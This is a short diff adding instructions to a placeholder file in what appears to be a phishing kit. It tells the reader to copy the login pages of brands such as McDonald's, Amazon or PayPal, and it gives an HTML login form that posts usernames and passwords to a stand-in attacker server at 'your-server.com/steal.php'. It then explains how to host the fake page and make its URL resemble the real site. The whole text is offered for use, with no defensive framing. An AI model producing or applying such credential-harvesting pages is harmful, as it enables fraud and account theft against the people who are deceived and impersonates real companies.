@@ -1,1 +1,25 @@
 REPLACE WITH ANY PHISHING HTML OF YOUR CHOICE 
+
+you can use any HTML phishing page you want like mcdonalds amazon or paypal
+
+
+    use tools like Burp Suite or Selenium to capture the target site’s HTML
+    replace the form action URL with your server IP (e.g., http://your-server.com/steal.php).
+
+customize the HTML
+
+    modify the <title>, <h1>, and <form> to match the target site
+    for **example**, to mimic mcodnalds, replace the form with:
+			
+<form action="http://your-server.com/steal.php" method="POST">  
+    <input type="text" name="username" placeholder="Email or Username" required>  
+    <input type="password" name="password" placeholder="Password" required>  
+    <input type="submit" value="Login">  
+</form>  
+
+			**YOU CAN FIND PHISHING PAGES ALL OVER GITHUB / INTERNET IF YOU SEARCH FOR THEM**
+
+host it on ur server
+
+    use a simple HTTP server to serve the phishing page like (python -m http.server 80)
+    ensure the URL in the form matches the target site (e.g., mcdonalds.com)
